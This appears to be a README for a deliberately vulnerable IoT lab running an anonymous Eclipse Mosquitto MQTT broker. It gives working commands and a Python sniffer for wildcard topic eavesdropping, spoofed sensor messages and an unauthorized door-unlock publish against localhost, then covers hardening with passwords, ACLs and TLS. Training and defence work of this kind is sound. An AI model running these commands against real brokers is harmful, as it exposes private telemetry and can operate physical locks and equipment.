# Vulnerable IoT MQTT Broker & Telemetry Gateway (Eclipse Mosquitto)

## Overview

Message Queuing Telemetry Transport (MQTT) is the de-facto messaging protocol across the Internet of Things (IoT), smart city infrastructure, connected automotive platforms, medical telemetry, and Industrial IoT (IIoT). Designed as an ultra-lightweight publish/subscribe model, MQTT is engineered for resource-constrained embedded sensors communicating over high-latency networks.

In default or rushed deployments, MQTT brokers are frequently deployed without password authentication (`allow_anonymous true`) and over plaintext transport (TCP port 1883 or WebSocket port 9001). This misconfiguration enables unauthorized network participants to perform **Wildcard Topic Sniffing** (`#`), eavesdropping on live sensor telemetries, device GPS coordinates, and internal authentication tokens, or publishing unauthorized commands to manipulate physical actuators, smart locks, or industrial valves.

- **MQTT Plaintext TCP**: Port `1883`
- **MQTT over WebSockets**: Port `9001`
- **Docker Shortcut**: `./lab start iot-mqtt`
- **Container Name**: `cyberlab_realworld_mqtt_broker`
- **RAM Footprint**: ~30 MB (Eclipse Mosquitto C runtime)

---

## Architecture & Pub/Sub Threat Model

```
+-------------------------------------------------------------+
|                IoT Field Devices / Actuators                |
|  - Publishes: factory/sensors/temp, home/lock/status        |
+-------------------------------------------------------------+
                               |
                        TCP Port 1883
                               v
+-------------------------------------------------------------+
|           Vulnerable Mosquitto MQTT Broker Container        |
|  - Listener: 0.0.0.0:1883 (TCP)                             |
|  - Listener: 0.0.0.0:9001 (WebSockets)                      |
|  - allow_anonymous: true                                    |
+-------------------------------------------------------------+
                               ^
                        TCP Port 1883
                               |
+-------------------------------------------------------------+
|               Attacker Machine (mosquitto_sub/pub)          |
|  - Subscribes to '#' (Eavesdrops on all sensor telemetry)   |
|  - Publishes to 'home/lock/command' ('{"action":"UNLOCK"}') |
+-------------------------------------------------------------+
```

---

## Key IoT Attack Scenarios & Exercises

### 1. Global Wildcard Topic Sniffing (`#` and `$SYS/#`)
MQTT topics use forward slashes as hierarchical topic delimiters (`home/livingroom/temperature`). The `#` character is a multi-level wildcard. Subscribing to `#` intercepts all messages published across the entire broker:

```bash
# Eavesdrop on all user and application messages
docker run --rm --network host eclipse-mosquitto:latest \
  mosquitto_sub -h localhost -p 1883 -t "#" -v

# Inspect internal broker telemetry, connected clients, and message statistics
docker run --rm --network host eclipse-mosquitto:latest \
  mosquitto_sub -h localhost -p 1883 -t "\$SYS/#" -v
```

### 2. Injecting Spoofed Sensor Telemetry
Attackers can publish fraudulent sensor measurements to trigger downstream alerting or skew data pipelines:

```bash
# Publish fake temperature telemetry
docker run --rm --network host eclipse-mosquitto:latest \
  mosquitto_pub -h localhost -p 1883 -t "factory/line1/sensor/temperature" \
  -m '{"temp_c": 128.5, "status": "CRITICAL_OVERHEAT"}'
```

### 3. Unauthorized Actuator Control & Command Injection
If smart devices or PLCs subscribe to command topics without message signing or authorization checks, an attacker can directly actuate physical hardware:

```bash
# Send an unauthorized unlock command to a physical access controller
docker run --rm --network host eclipse-mosquitto:latest \
  mosquitto_pub -h localhost -p 1883 -t "facility/door/main_entrance/control" \
  -m '{"command": "UNLOCK", "override": true, "actor": "emergency_service"}'
```

### 4. Interactive Python Hacking Script
Using Python `paho-mqtt` to intercept and manipulate messages in real time:

```python
import paho.mqtt.client as mqtt

def on_message(client, userdata, message):
    print(f"[SNIFFED] Topic: {message.topic} | Payload: {message.payload.decode()}")

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
client.on_message = on_message
client.connect("localhost", 1883, 60)
client.subscribe("#")
client.loop_forever()
```

---

## Defensive Remediation & Hardening

1. **Disable Anonymous Access**:
   Mandate credentials in `/mosquitto/config/mosquitto.conf`:
   ```text
   allow_anonymous false
   password_file /mosquitto/config/passwords
   ```
   Generate hashed password entries using `mosquitto_passwd`.
2. **Implement Topic Access Control Lists (ACLs)**:
   Restrict clients to only their designated topic prefixes:
   ```text
   # Sensor client can only write to its own topic
   user temperature_sensor_01
   topic write factory/line1/sensor/temperature

   # Operator client can only read telemetry and send commands
   user operator_console
   topic read factory/line1/sensor/+
   topic write factory/line1/command/+
   ```
3. **Enforce Transport Layer Security (MQTTS on Port 8883)**:
   Never deploy unencrypted MQTT over untrusted or shared networks. Enforce mutual certificate authentication (mTLS) so both the broker and the IoT clients verify cryptographic identities.

---

## Video Walkthroughs & Technical References

- [Getting Started with the Mosquitto MQTT Broker (with SSL/TLS)](https://www.youtube.com/watch?v=-bKEWqcyEBY)
- [Eclipse Mosquitto Official Documentation](https://mosquitto.org/documentation/)
- [OWASP Internet of Things (IoT) Top 10](https://owasp.org/www-project-internet-of-things/)
